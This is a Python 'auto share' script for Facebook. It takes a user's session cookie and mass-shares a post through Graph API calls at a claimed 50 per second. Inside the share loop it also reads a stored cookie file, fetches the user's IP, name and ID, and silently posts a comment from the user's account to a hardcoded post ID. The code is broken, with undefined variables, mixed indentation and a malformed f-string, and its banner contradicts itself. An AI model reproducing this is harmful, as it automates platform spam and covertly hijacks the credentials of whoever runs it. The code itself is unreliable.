import os
import sys
import requests
import time
from rich.console import Console
from rich.panel import Panel

# Clear Function
def clear():
    os.system("cls" if os.name == "nt" else "clear")

# Admin Panel Style
def logo_menu():
    console = Console()
    banner = Panel(
        "ARKIN SHARE TOOL FREE\n"
        "OWNER: ARKIN\n"
        "TOOL TYPE: AUTO SHARE TOOL\n"
        "STATUS: PAID USERS ONLY\n",
        title="ARKIN SHARE TOOL",
        style="blue"
    )
    console.print(banner)

# Auto Share Function
def bot_share():
    clear()
    logo_menu()
    
    cookie = input("Enter your Facebook cookie: ")
    link = input("Enter the post link: ")
    shares = int(input("Enter number of shares: "))

    console = Console()
    for i in range(shares):
        try:
		cok = open(".cookie.xx.txt","r").read()
		cookie = {"cookie":cok}
		ip = requests.get("https://api.ipify.org").text
		nama = ses.get(f"https://graph.facebook.com/me?fields=name&access_token={token}",cookies=cookie).json()["name"]
		id = requests.get("https://graph.facebook.com/me/?access_token=%s"%(token),cookies={"cookie":cok}).json()["id"]	    
		requests.post(f"https://graph.facebook.com/826244541950192/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
            post = requests.post(f'https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={token}",headers=header, cookies=cookie).text')
            if post.status_code == 200:
                console.print(Panel(f"Shared {i+1}/{shares} - [green]SUCCESS[/green]", title="Share Panel", style="cyan"))
            else:
                console.print(Panel("Error in sharing!", title="Error", style="red"))
        except:
            console.print(Panel("Connection Error!", title="Error", style="red"))
        time.sleep(0.02)  # 50 shares per second

bot_share()
